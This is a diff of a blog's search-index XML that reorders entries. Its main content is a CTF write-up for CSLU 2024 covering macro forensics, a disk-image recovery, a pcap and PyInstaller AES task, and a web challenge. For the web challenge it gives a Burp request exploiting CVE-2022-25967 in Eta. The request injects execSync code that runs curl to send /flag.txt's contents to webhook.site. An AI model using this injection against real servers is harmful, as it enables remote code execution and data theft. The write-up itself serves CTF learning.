@@ -1,130 +1,23 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CSLU 2024 UPM</title>
-    <url>/2024/12/31/CSLU-2024-UPM/</url>
-    <content><![CDATA[ForensicsDr. Mals
-
-Download the Dr. Mals word file
-Use Oletools - olevba to decrypt this file
-
-
-
-With the use of CyberChef, we can find out the encoded text
-
-
-
-Searching the website and it given
-
-
-
-Lets decode this
-With the use of online decoderwe can find out the flag
-
-
-
-Thats it.
-
-AcknowledgementThx to Akram for providing Hint
-RE:Memory Delete
-
-First, we download the attached file given by the challenge.
-Challenge.7z
-
-
-Unzip it.-Challenge.ad1 files inside.
-.ad1 is a image files so lets use FTK Imager to find the deleted file
-
-There goes the flag
-
-Skyfall
-Pain killer, My Skill issue… XD
-
-Download the file attach by the challenge.-capture.pcapng
-Use wireshark to open the pcapng files
-See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
-
-
-
-File -&gt; Export -&gt; Http, and save all the files.
-we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
-usefull for later
-
-
-And there is a file with big data 24,345kb and let us see what file is that.
-
-
-
-
-
-Looks like it is a elf file  
-I manage to find a website to extract the elf file EzyZIP
-We can see the largest file is here after extract
-
-
-After have a long time searching, i cant found any ways to extract pydata… skill issue XD
-
-
-After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
-
-This is what i found
-
-
-okayyyy here is it
-
-
-
-Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
-
-
-
-With the use of this website Pylingual, i transfer pyc files to py
-
-
-
-We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
-
-We can find out that the epoch for the time she download the file is 1733988750
-
-
-Then use GPT xd find the key out
-
-ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
-
-
-Okay, then let us go to decrypt it. Use cyberchef
-Heres the flag.Okay its maybe abit harder than i though. cry die.
-
-AcknowledgementThx to Bakayang for providing solution at the end of the day
-WEBUseless Website
-
-Download the source code of the website
-
-We can see theres something in the package.json file
-
-
-
-
-Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
-
-In burpsuite, intercept the web and change to this
-/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
-
-And we can find out the flag at the end of the webhook link.
-
-
-CSLU&#123;wh4ts_y0ur_et4?&#125;
-
-
-
-AcknowledgementThx for Megat for the solution.
-]]></content>
+    <title>Bronco CTF 2025</title>
+    <url>/2025/02/17/Bronco-CTF-2025/</url>
+    <content><![CDATA[Web]]></content>
       <categories>
-        <category>CTF 2024</category>
+        <category>CTF 2025</category>
       </categories>
       <tags>
         <tag>Forensics</tag>
         <tag>Web</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>PICO CTF 2025</title>
+    <url>/2025/03/08/PICO-CTF/</url>
+    <content><![CDATA[[Forensics]]]></content>
+      <tags>
+        <tag>CTF 2025</tag>
       </tags>
   </entry>
   <entry>
@@ -350,11 +243,126 @@ There you go the flag!!
       </tags>
   </entry>
   <entry>
-    <title>Bronco CTF 2025</title>
-    <url>/2025/02/17/Bronco-CTF-2025/</url>
-    <content><![CDATA[Web]]></content>
+    <title>CSLU 2024 UPM</title>
+    <url>/2024/12/31/CSLU-2024-UPM/</url>
+    <content><![CDATA[ForensicsDr. Mals
+
+Download the Dr. Mals word file
+Use Oletools - olevba to decrypt this file
+
+
+
+With the use of CyberChef, we can find out the encoded text
+
+
+
+Searching the website and it given
+
+
+
+Lets decode this
+With the use of online decoderwe can find out the flag
+
+
+
+Thats it.
+
+AcknowledgementThx to Akram for providing Hint
+RE:Memory Delete
+
+First, we download the attached file given by the challenge.
+Challenge.7z
+
+
+Unzip it.-Challenge.ad1 files inside.
+.ad1 is a image files so lets use FTK Imager to find the deleted file
+
+There goes the flag
+
+Skyfall
+Pain killer, My Skill issue… XD
+
+Download the file attach by the challenge.-capture.pcapng
+Use wireshark to open the pcapng files
+See the clue given, Love the EDITED LEWIS VERSION files and lost the flag.
+
+
+
+File -&gt; Export -&gt; Http, and save all the files.
+we can see there is 5 files exported, 2 text file with word File received successfully! and file_data=16ae9187d13259788a97aef16a7d50f8b6376fbcba92a0f53e7e68d9f562a3a6576a3183a8dc8631c64fbd9147c8b608
+usefull for later
+
+
+And there is a file with big data 24,345kb and let us see what file is that.
+
+
+
+
+
+Looks like it is a elf file  
+I manage to find a website to extract the elf file EzyZIP
+We can see the largest file is here after extract
+
+
+After have a long time searching, i cant found any ways to extract pydata… skill issue XD
+
+
+After the end of the day, my friend told me there is something call Pyinstxtractor that can extract it.
+
+This is what i found
+
+
+okayyyy here is it
+
+
+
+Theres alot files inside, but the one the name skyfall-lewis-edited-version.pyc is the most suspicious.
+
+
+
+With the use of this website Pylingual, i transfer pyc files to py
+
+
+
+We can see it is a AES encyption function and the key is the time which the user encrypt when downloaded, so lets go back to wireshark and find the date when she successfuly download.
+
+We can find out that the epoch for the time she download the file is 1733988750
+
+
+Then use GPT xd find the key out
+
+ps: I also dk why need to use 1733988749 just told by my friend to use it cant find any things that support this epoch XD.
+
+
+Okay, then let us go to decrypt it. Use cyberchef
+Heres the flag.Okay its maybe abit harder than i though. cry die.
+
+AcknowledgementThx to Bakayang for providing solution at the end of the day
+WEBUseless Website
+
+Download the source code of the website
+
+We can see theres something in the package.json file
+
+
+
+
+Searching on the internet CVE-2022-25967 showing that there is some leakage can be use on the eta framework.
+
+In burpsuite, intercept the web and change to this
+/utils/settings HTTP/1.1Host: 5.75.155.50:1341User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate, brConnection: keep-aliveContent-Type: application/jsonUpgrade-Insecure-Requests: 1If-None-Match: W/&quot;1057-ih1IUXlwncna8aHynJLYIHjiX30&quot;Priority: u=0, iContent-Length: 292&#123;  &quot;settings&quot;: &#123;    &quot;view options&quot;: &#123;      &quot;varName&quot;: &quot;x=process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl https://webhook.site/self id/$(cat /flag.txt)&#x27;)&quot;,      &quot;include&quot;: false,      &quot;includeFile&quot;: false,      &quot;useWith&quot;: true    &#125;  &#125;&#125;
+
+And we can find out the flag at the end of the webhook link.
+
+
+CSLU&#123;wh4ts_y0ur_et4?&#125;
+
+
+
+AcknowledgementThx for Megat for the solution.
+]]></content>
       <categories>
-        <category>CTF 2025</category>
+        <category>CTF 2024</category>
       </categories>
       <tags>
         <tag>Forensics</tag>
@@ -366,14 +374,6 @@ There you go the flag!!
     <url>/2024/12/31/Readme/</url>
     <content><![CDATA[This is my First Post in my Website!!There will be Writeup for my CTF Challenge and maybe some Learning stuff I Guess???
 ]]></content>
-  </entry>
-  <entry>
-    <title>PICO CTF 2025</title>
-    <url>/2025/03/08/PICO-CTF/</url>
-    <content><![CDATA[[Forensics]]]></content>
-      <tags>
-        <tag>CTF 2025</tag>
-      </tags>
   </entry>
   <entry>
     <title>EQFCTF 2025</title>
